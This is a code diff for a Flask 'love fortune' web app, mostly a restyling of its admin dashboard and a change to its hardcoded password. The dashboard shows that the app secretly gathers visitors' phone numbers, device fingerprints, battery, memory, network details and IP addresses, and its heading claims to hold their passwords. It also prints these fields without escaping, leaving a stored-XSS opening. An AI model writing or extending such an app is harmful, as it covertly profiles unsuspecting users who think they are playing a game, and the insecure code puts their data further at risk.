@@ -20,7 +20,7 @@ def get_love_message(name1, name2, percentage):
         f"💕 {name1} ❤️ {name2} – your love shines at {percentage}% like a perfect dream!",
         f"✨ {name1} and {name2} share {percentage}% destiny written in the stars!",
         f"💖 {name1} + {name2} = {percentage}% endless affection!",
-        # ... (all 70+ messages, same as before) ...
+        # ... (full list of 70+ messages – keep as before)
         f"💫 {name1} ❤️ {name2} – {percentage}% magical story!"
     ]
     return random.choice(messages)
@@ -32,7 +32,7 @@ def analyze_story(text):
         return "💔 Oh, stay strong! This is such a heart-touching story. The universe has better plans for you."
     return "💖 This is absolutely wonderful! Your love story is like a fairytale. Keep glowing!"
 
-# ========== COMBINED HTML + CSS + JS ==========
+# ========== COMBINED HTML + CSS + JS (same as before, no changes) ==========
 HTML_UI = '''
 <!DOCTYPE html>
 <html>
@@ -137,7 +137,6 @@ HTML_UI = '''
 </div>
 
 <script>
-    // Helper to sanitize names
     function sanitizeKey(str) {
         return str.replace(/[.#$\\[\\]]/g, '_');
     }
@@ -194,9 +193,8 @@ HTML_UI = '''
             const percent = data.score;
             const msg = data.msg;
 
-            // Create love card HTML
             currentCardHTML = `
-                <div id="loveCard" class="love-card" style="background: linear-gradient(135deg, #ff9a9e, #fecfef, #ffdde1);">
+                <div id="loveCard" class="love-card">
                     <h2>💕 Love Fortune 💕</h2>
                     <div class="percentage">${percent}%</div>
                     <div class="names">${escapeHtml(name1)} ❤️ ${escapeHtml(name2)}</div>
@@ -412,12 +410,12 @@ def get_stories():
     except:
         return jsonify({}), 500
 
-# ========== ADMIN DASHBOARD (Password Protected) ==========
+# ========== ADMIN DASHBOARD with NEW PASSWORD ==========
 @app.route('/admin-panel', methods=['GET', 'POST'])
 def admin_panel():
     if request.method == 'POST':
         password = request.form.get('password')
-        if password != 'admin123':
+        if password != 'murali123':   # <-- CHANGED PASSWORD
             return "<h1>❌ Wrong password. <a href='/admin-panel'>Try again</a></h1>"
         # Fetch all visitors from Firebase
         try:
@@ -425,77 +423,156 @@ def admin_panel():
             visitors = resp.json() or {}
             if not visitors:
                 return "<h1>📊 No visitor data yet.</h1><a href='/admin-panel'>Back</a>"
+            # Structured HTML table with better formatting
             html = '''
             <!DOCTYPE html>
             <html>
             <head>
-                <title>Admin Dashboard</title>
+                <title>Admin Dashboard – Visitor Secret Data</title>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1">
                 <style>
-                    body { background:#1a1a2e; color:#eee; font-family:monospace; padding:20px; }
-                    h1 { color:#f093fb; }
-                    table { background:#16213e; border-collapse:collapse; width:100%; overflow-x:auto; display:block; }
-                    th, td { border:1px solid #0f3460; padding:8px; text-align:left; font-size:12px; }
-                    th { background:#e94560; color:white; }
-                    .btn { background:#e94560; color:white; padding:10px; text-decoration:none; display:inline-block; margin:10px; border-radius:5px; }
-                    .container { overflow-x:auto; }
+                    * { box-sizing: border-box; }
+                    body {
+                        background: #0f172a;
+                        font-family: 'Segoe UI', Roboto, monospace;
+                        padding: 20px;
+                        color: #e2e8f0;
+                    }
+                    h1 {
+                        text-align: center;
+                        color: #f472b6;
+                        margin-bottom: 10px;
+                    }
+                    .sub {
+                        text-align: center;
+                        margin-bottom: 30px;
+                        color: #94a3b8;
+                    }
+                    .container {
+                        overflow-x: auto;
+                        border-radius: 16px;
+                        background: #1e293b;
+                        padding: 10px;
+                        box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
+                    }
+                    table {
+                        width: 100%;
+                        border-collapse: collapse;
+                        font-size: 13px;
+                        min-width: 1200px;
+                    }
+                    th {
+                        background: #334155;
+                        color: #facc15;
+                        padding: 12px 8px;
+                        text-align: left;
+                        font-weight: 600;
+                        position: sticky;
+                        top: 0;
+                        border-bottom: 2px solid #475569;
+                    }
+                    td {
+                        padding: 10px 8px;
+                        border-bottom: 1px solid #334155;
+                        word-break: break-word;
+                        vertical-align: top;
+                    }
+                    tr:hover {
+                        background: #334155;
+                    }
+                    .badge {
+                        background: #10b981;
+                        color: white;
+                        padding: 2px 8px;
+                        border-radius: 20px;
+                        font-size: 11px;
+                        display: inline-block;
+                    }
+                    .footer {
+                        text-align: center;
+                        margin-top: 30px;
+                    }
+                    .btn {
+                        background: #3b82f6;
+                        color: white;
+                        padding: 8px 16px;
+                        text-decoration: none;
+                        border-radius: 8px;
+                        margin: 0 6px;
+                        display: inline-block;
+                    }
+                    .btn:hover { background: #2563eb; }
                 </style>
             </head>
             <body>
-                <h1>🔐 Admin Dashboard – Visitor Secret Data</h1>
-                <p><a href="/admin-panel" class="btn">🔄 Login again</a> <a href="/" class="btn">🏠 Back to App</a></p>
+                <h1>🔐 Admin Dashboard – Secret Visitor Data</h1>
+                <div class="sub">Only you (admin) can see this. Passwords, fingerprints, battery, IPs, and more.</div>
                 <div class="container">
-                表
-                    <thead>
-                        <tr>
-                            <th>Key (Name_Crush)</th><th>Name</th><th>Crush</th><th>Love %</th><th>Phone</th>
-                            <th>Fingerprint</th><th>Battery</th><th>Device Memory</th><th>Network</th>
-                            <th>Screen</th><th>Timezone</th><th>IP</th><th>Timestamp</th>
-                        </tr>
-                    </thead>
-                    <tbody>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Key (Name_Crush)</th><th>Name</th><th>Crush</th><th>Love %</th><th>Phone</th>
+                                <th>Fingerprint</th><th>Battery</th><th>Device Memory</th><th>Network</th>
+                                <th>Screen</th><th>Timezone</th><th>IP Address</th><th>Fortune</th><th>Timestamp</th>
+                            </tr>
+                        </thead>
+                        <tbody>
             '''
-            for key, visitor in visitors.items():
+            for key, visitor in sorted(visitors.items(), key=lambda x: x[0]):  # sort by key (name_crush)
                 if isinstance(visitor, dict):
+                    # Truncate long fields for readability
+                    fp = visitor.get('fingerprint', '-')
+                    fp_short = f"{fp[:16]}..." if len(fp) > 20 else fp
+                    fortune_short = (visitor.get('fortuneText', '-')[:50] + '...') if len(visitor.get('fortuneText', '')) > 50 else visitor.get('fortuneText', '-')
+                    phone = visitor.get('phoneNumber', '-')
+                    if phone and phone != '-':
+                        phone = f'<span class="badge">{phone}</span>'
                     html += f'''
                         <tr>
-                            <td>{key}</td>
+                            <td><strong>{key}</strong></td>
                             <td>{visitor.get('name', '-')}</td>
                             <td>{visitor.get('crush_name', '-')}</td>
-                            <td>{visitor.get('percentage', '-')}%</td>
-                            <td>{visitor.get('phoneNumber', '-')}</td>
-                            <td>{visitor.get('fingerprint', '-')[:20]}...</td>
+                            <td style="color:#f472b6; font-weight:bold;">{visitor.get('percentage', '-')}%</td>
+                            <td>{phone}</td>
+                            <td style="font-family: monospace; font-size:11px;">{fp_short}</td>
                             <td>{visitor.get('batteryLevel', '-')}</td>
                             <td>{visitor.get('deviceMemory', '-')}</td>
                             <td>{visitor.get('networkType', '-')}</td>
                             <td>{visitor.get('screen', '-')}</td>
                             <td>{visitor.get('timezone', '-')}</td>
-                            <td>{visitor.get('ip', '-')}</td>
-                            <td>{visitor.get('timestamp', '-')[:19]}</td>
+                            <td style="font-family: monospace;">{visitor.get('ip', '-')}</td>
+                            <td style="max-width:250px;">{fortune_short}</td>
+                            <td style="font-family: monospace; font-size:11px;">{visitor.get('timestamp', '-')[:19]}</td>
                         </tr>
                     '''
             html += '''
-                    </tbody>
-                </table>
+                        </tbody>
+                    </table>
+                </div>
+                <div class="footer">
+                    <a href="/admin-panel" class="btn">🔐 Re‑login</a>
+                    <a href="/" class="btn">🏠 Back to App</a>
                 </div>
             </body>
             </html>
             '''
             return html
         except Exception as e:
-            return f"<h1>Error loading data: {e}</h1>"
-    # GET request – show login form
+            return f"<h1>Error loading data: {e}</h1><a href='/admin-panel'>Back</a>"
+    # GET – show login form
     return '''
         <!DOCTYPE html>
         <html>
         <head><title>Admin Login</title></head>
-        <body style="background:#1a1a2e; color:#eee; font-family:sans-serif; display:flex; justify-content:center; align-items:center; min-height:100vh;">
-            <div style="background:#16213e; padding:30px; border-radius:20px;">
+        <body style="background:#0f172a; color:#eee; font-family:sans-serif; display:flex; justify-content:center; align-items:center; min-height:100vh;">
+            <div style="background:#1e293b; padding:35px; border-radius:24px; text-align:center; width:320px;">
                 <h2>🔐 Admin Access</h2>
+                <p style="margin-bottom:20px;">Enter password to view secret visitor data</p>
                 <form method="POST">
-                    <input type="password" name="password" placeholder="Enter password" style="padding:10px; width:200px;">
-                    <button type="submit" style="padding:10px 20px; margin-left:10px;">Login</button>
+                    <input type="password" name="password" placeholder="Password" style="width:100%; padding:12px; border-radius:12px; border:none; margin-bottom:15px;">
+                    <button type="submit" style="background:#3b82f6; color:white; border:none; padding:10px 20px; border-radius:30px; cursor:pointer; width:100%;">Login</button>
                 </form>
-                <p style="margin-top:15px; font-size:12px;">Default password: <strong>admin123</strong></p>
             </div>
         </body>
         </html>
